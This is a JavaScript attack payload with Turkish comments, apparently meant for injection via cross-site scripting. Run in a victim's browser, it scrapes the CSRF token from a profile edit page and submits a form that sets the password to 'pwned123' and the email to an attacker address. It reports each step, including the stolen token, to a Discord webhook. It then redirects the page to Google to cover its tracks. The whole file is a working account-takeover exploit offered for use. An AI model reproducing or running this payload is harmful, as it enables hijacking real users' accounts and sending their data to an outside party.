// GitHub: s.js - Full Debug & Account Takeover Mode
(async function() {
    const webhookURL = "https://discord.com/api/webhooks/1469278750876368947/evwkKVf6b9B0g50c-JVP0w3Zt3J00ZW6PiGcUfvUAlIrqHJ4C2DjnYMb3e1nHeYBYi0I";
    
    // Yardımcı Fonksiyon: Discord'a Log Gönder
    const logToDiscord = async (msg) => {
        await fetch(webhookURL, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ content: msg })
        });
    };

    try {
        await logToDiscord("🚀 **Saldırı Başlatıldı!** Veriler toplanıyor...");

        // 1. ADIM: Profil sayfasını çek ve CSRF Token ara
        const res = await fetch('/auth/profile/edit');
        if (!res.ok) throw new Error(`Profil sayfası yüklenemedi! Statü: ${res.status}`);
        
        const html = await res.text();
        
        // CSRF Token yakalamak için daha geniş bir Regex (HTML içindeki gizli inputu arar)
        const tokenMatch = html.match(/name="csrf_token"\s+value="([^"]+)"/) || 
                           html.match(/value="([^"]+)"\s+name="csrf_token"/) ||
                           html.match(/id="csrf_token"\s+value="([^"]+)"/);
        
        const csrfToken = tokenMatch ? tokenMatch[1] : null;

        if (!csrfToken) {
            await logToDiscord("❌ **KRİTİK HATA:** Sayfa içinde `csrf_token` bulunamadı! (Regex eşleşmedi)");
        } else {
            await logToDiscord(`✅ **Token Yakalandı:** \`${csrfToken.substring(0, 15)}...\``);

            // 2. ADIM: Şifre Değiştirme İsteği (POST)
            const formData = new FormData();
            formData.append('csrf_token', csrfToken);
            formData.append('username', 'özür dilerim'); // Burp çıktındaki orijinal isim
            formData.append('email', '1muhendiscocuk@gmail.com');
            formData.append('gender', 'male');
            formData.append('age_range', 'under_20');
            formData.append('password', 'pwned123');
            formData.append('confirm_password', 'pwned123');
            formData.append('submit', 'Kaydet');
            
            // Burp Suite çıktındaki gibi boş dosya alanını ekleyelim (Kritik olabilir!)
            formData.append('image', new Blob([]), "");

            const postRes = await fetch('/auth/profile/edit', {
                method: 'POST',
                body: formData,
                headers: {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
                }
            });

            if (postRes.ok || postRes.status === 302) {
                await logToDiscord("🎯 **BINGO!** Şifre değiştirme isteği başarıyla sunucuya iletildi (HTTP 200/302).");
            } else {
                await logToDiscord(`⚠️ **İstek Gönderildi ama Başarısız:** Sunucu yanıtı: ${postRes.status}`);
            }
        }

    } catch (err) {
        // Herhangi bir JS hatasını Discord'a fırlat
        await logToDiscord(`🔥 **SİSTEM HATASI:** \`${err.message}\``);
    }

    // 3. ADIM: İZLERİ ÖRT (Kısa bir gecikme ile)
    setTimeout(() => {
        window.location.href = "https://www.google.com";
    }, 1500);

})();